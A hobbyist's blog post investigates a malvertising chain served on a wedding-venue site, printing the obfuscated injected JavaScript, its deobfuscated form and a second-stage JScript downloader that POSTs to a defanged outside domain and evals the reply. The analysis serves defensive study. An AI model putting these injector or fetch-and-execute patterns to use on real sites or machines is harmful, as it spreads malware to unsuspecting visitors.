---
layout: post
title: UltimateUpdate
description: Small investigation into weird malware I was served.
excerpt_separator: <!--more-->
categories:
- Vulnerability Research
author:
- Axel Persinger
---



I was on a site browsing for wedding venues in Virginia (:eyes:), and while on a site, my entire screen changed to one of the typical "Your {Internet Browser} is out of date. Click here to update!". When I clicked the link to see what would happen, this led me down a rabbit hole!
<!--more-->
I thought it was pretty weird Thta I was served this ad in the first place, since I have uBlock Origin, and it's pretty good at preventing these sorts of ads. Because I have no respect for my computer, I decided to YOLO it and click the "Download Update!" button. It downloaded a ZIP file named `Firefοx.106.63418.18456.9503fcf0.zip` from a JavaScript Blob (URL: `blob:null/06285e4d-82c0-4901-b6c3-f7d713a410a3`). This means I won't be able to re-download it, and unfortunately I navigated away from the page so I don't have the original.

I repackaged the zip file into a 7Zip in this repo with the password `infected`.

## Hunt for the Original
First thing I want to do for this "investigation" is to see what the original payload is. That way I can see the logic in targetting, or if there are any other payloads. I went back through my browsing history to see if I could eventually find it, and on the page `hxxps[://]www[.]weddingrule[.]com/wedding-venues/virginia/north-va/` I see that it loads a Blob:

```javascript
;(function(){var dq=document.referrer;var ad=window.location.href;var xw=navigator.userAgent;var ej=new RegExp(vz('p:p/z/j(a[c^y/t]c+x)y/x'));if(!dq||ad.match(ej)[1]==dq.match(ej)[1]||xw.indexOf(vz('xWvitnadrobwbsr'))==-1||window.localStorage[vz('k_m_h_suetemmal')]){return;}var kf=vz('usvcxrqizpktc');var ox=document.createElement(kf);ox.async=true;ox.src=vz('shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u');var fq=document.getElementsByTagName(kf)[0];fq.parentNode.insertBefore(ox,fq);function vz(wm){var yo='';for(var ud=0;ud<wm.length;ud++){if(ud%2){yo+=wm[ud];}}return yo;}})();
```

Which, running it through a [deobfuscator](https://deobfuscate.io/), turns into:

```javascript
;
(function () {
  var dq = document.referrer;
  var ad = window.location.href;
  var xw = navigator.userAgent;
  var ej = new RegExp(vz("p:p/z/j(a[c^y/t]c+x)y/x"));
  if (!dq || ad.match(ej)[1] == dq.match(ej)[1] || xw.indexOf(vz("xWvitnadrobwbsr")) == -1 || window.localStorage[vz("k_m_h_suetemmal")]) {
    return;
  }
  var kf = vz("usvcxrqizpktc");
  var ox = document.createElement(kf);
  ox.async = true;
  ox.src = vz("shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u");
  var fq = document.getElementsByTagName(kf)[0];
  fq.parentNode.insertBefore(ox, fq);
  function vz(wm) {
    var yo = "";
    for (var ud = 0; ud < wm.length; ud++) {
      if (ud % 2) {
        yo += wm[ud];
      }
    }
    return yo;
  }
}());
```

This is clearly an attempt to obfuscate what the code is doing, so I'll do the work to "reverse-engineer" this into something that makes more sense:

```javascript

/**
 * @brief Deobfuscates a string
 * @details Takes every other character of the original string
 *
 * @param {string} obfuscated_str Obfuscated string to deobfuscate
 * @returns {string} Deobfuscated string
 */
function deobfuscate_str(obfuscated_str) {
    var deobfuscated_str = "";
    for (var i = 0; i < obfuscated_str.length; i++) {
        if (i % 2) {
            deobfuscated_str += obfuscated_str[i];
        }
    }
    return deobfuscated_str;
}

// Check if any are true, if so return:
//  1. No referrer
//  2. The current page and the referrer both have match the regex "://([^/]+)/"
//  3. The User Agent does *not* have the string "Windows"
//  4. The key "___utma" in the local storage has a "truthy" value
var re = new RegExp(deobfuscate_str("p:p/z/j(a[c^y/t]c+x)y/x") /* ://([^/]+)/ */);
if (
    !document.referrer || window.location.href.match(re)[1] == document.referrer.match(re)[1] || 
    navigator.userAgent.indexOf(deobfuscate_str("xWvitnadrobwbsr") /* Windows */) == -1 || 
    window.localStorage[deobfuscate_str("k_m_h_suetemmal") /* ___utma */]
) {
    return;
}

// 1. Create a <script> element
// 2. Set the element's "async" attribute to "true"
// 3. Set the element's "src" attribute to "hxxps[://]training[.]c1ypsilanti[.]org/report?r=dj01MDY1NDg3MTIwZTU2ZmQ1ZTZlNCZjaWQ9MjY0"
// 4. Get all elements with the tag "<script>"
// 5. Insert the newly created element above that
var script_str = deobfuscate_str("usvcxrqizpktc") /* script */;
var script_elem = document.createElement(script_str);
script_elem.async = true;
script_elem.src = deobfuscate_str("shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u") /* hxxps[://]training[.]c1ypsilanti[.]org/report?r=dj01MDY1NDg3MTIwZTU2ZmQ1ZTZlNCZjaWQ9MjY0 */;
var script_elem_ = document.getElementsByTagName(script_str)[0];
script_elem_.parentNode.insertBefore(script_elem, script_elem_);
```

I tried visiting the site, and nothing appeard. Their webserver must be doing some sort of filtering based on referrer, or something. I can get it to trigger and add the `<script>` element, but the webserver isn't returning anything new for me. Maybe it's based on IP, and it refuses to return content on IPs that has visited it... I'll download a VPN to see if I get a "new IP" and try from there. Unfortunately, I got the `<script>` tag added again, but still no response. 

I ran their site through [VirusTotal](https://www.virustotal.com/gui/url/4023d8e5092e1f3ecb943e1d8d8e6a7c907bfb51243d43d874a6f48decd35aeb/details), which returned with two hits (Avira and Kaspersky both claiming the site hosts Malware); all other scanners labelled this clean. Unsurprising, this domain was registered with privacy settings through FastDomain. It was registered on 02/01/2022, last updated on 06/14/2022.

I went to the parent domain, and it's masquerading as a WordPress site that's "Coming Soon". Interestingly enough, the title is "Church One Ypsilanti", of which, there is a real one! However, their domain is `https://churchoneypsilanti.org/`. The email associated with the church's FaceBook page is `c1ypsilanti[@]gmail[.]com` which is the same spelling as the masqueraded domain.

The entire situation is pretty weird; typically, if this were just adware, they wouldn't care about serving the same client twice. That just means double the chances of landing a victim. However, there was a semi-professional attempt at preventing serving the same client multiple times for this domain. Let's take a step back and look at some facts:

 - There is a church in Ypsilanti, MI called "Church One Ypsilanti", with a domain of `churchoneypsilanti.org` and email of `c1ypsilanti@gmail.com`
 - Someone registered a domain `c1ypsilanti[.]org`, which is the valid __email__ of the Church One Ypsilanti team
 - They aged the domain for about half a year
 - The root domain hosts a legitimate looking "Coming Soon" WordPress site
 - Someone infected a website, `weddingrule[.]org` to serve an infected JavaScript blob
 - This JavaScript blob is obfuscated
 - The JavaScript blob only redirects to the malicious domain if it hasn't done that in the past (it will add a `__uta` key in your local storage)
 - Even after manually removing traces of the `__uta` key, and trying to re-trigger the malicious site's content, the malicious site only returns an empty page.

 This is all pretty odd...

 Another route I want to take is see how the blob originally gets created and called from the acutal site. We'll go back into Chrome Dev Tools to check this out. I searched a unique string (`shntitiphss`) that was inside of the blob to see where it appeared on the page. The blob is wrapped in a `<script>` tag:

 ```html
<script id="6049c9e9056fa8c121a67cbec179fdac-1" type="nitropack/inlinescript" class="nitropack-inline-script">
  ...
</script>
```

It looks like this `nitropack` is a CDN that allows you to register "plugins" (i.e. the Google Analytics script snippet), that will dynamically add the scripts in when the page loads. It is unlikely that all of `weddingrule[.]org` was compromised, but rather, there is a supply chain attack against the original script that is hosted in NitroPack at the `6049c9e9056fa8c121a67cbec179fdac-1` ID.

I tried registering for an account on `nitropack` thinking that it would allow me to see what plugins they have, and potentially view the IDs for them, but no such luck. It seems that the process is much more involved.


## Inspecting the Payload
Unfortunately, I don't think there's much I can do to get the webserver to respond to me with a new payload, or trigger the pop-up again. I might go back on another computer and fudge around with it a bit later. I still have the original payload, so I'll keep going down that path.

The only contents of the directory is a JavaScript file titled `Installer.106.77570.17215.ded29e4a.js`. It's heavily obfuscated again, so I executed most of it, just making sure that it doesn't do anything dangerous on my machine.

```javascript
var req = new this['ActiveXObject']('MSXML2.XMLHTTP');
req['open']('POST', "hxxps[://]1e5c[.]internal[.]blessedfoodshalalmeat[.]com/ajaxTimeout", false);
req['send']("qjFBPkIVCAVpqGtz0fqzot4+8QBb4gsQOC6XwFuVfQ==");
var response = req['responseText'];
eval(response);
```

I modified the `eval` to be a `WScript.Echo` command and executed it, because... YOLO, right?

Unfortunately, because I lack foresight, I accidentally clicked the "OK." on the prompt that popped up and only saw the next stage payload appear for a minute. Then it was gone into the ether. I tried executing the script again, but much like the original ad I was served, it isn't re-downloading the payload. This is super disappointing because I saw that the code was executing some WMIC commands and doing a host survey.

The next day, I re-flashed my laptop with a fresh installation of Windows, went to a coffee shop and tried again. I was able to get the malicious blob served to me from the first site, however, it didn't transition into the malicious "Updated needed!" page. I went ahead and tried executing the last payload I had (the `ActiveXObject` downloader), but I was getting a weird error (`.\bad.js(3, 1) msxml3.dll: The system cannot locate the resource specified.`). After some googling to figure this out, I realized it's telling me that it can't resolve the DNS for the malicious domain. At first I thought it might be the coffee shop WiFi doing some filtering, but after using an online NS lookup tool, I realized that the DNS records were deleted some time last night. This must have been in response to the next stage having been downloaded. It's unclear whether deleting the DNS records was automatic or manual.

## Conclusion
This was a pretty weird series of events. I'm not sure what type of adversary this was. It was too advanced to be "spray-and-pray" adware, as they took down infrastructure and masqueraded with reasonable domains. I doubt it was anything targetted, because I'm a nobody, they didn't use any 0days, and dropping `.js` hoping that I would execute it is a big leap. So, I'm thinking it's somewhere in the middle, an adversary that doesn't target, but invests in reasonable tooling and obfuscation.

I did get to take away a decent lessons learned: always enable logging and take things more slowly during an investigation. When I used to work in cybersecurity analytics/threat hunt/incident response, I had a good set up with a lot of logging running. That most likely would have saved my bacon by capturing the output of the malicious JavaScript. However, since this was just a hobby "investigation", I didn't take it as seriously, and missed out on what could have been a much deeper rabbit hole!
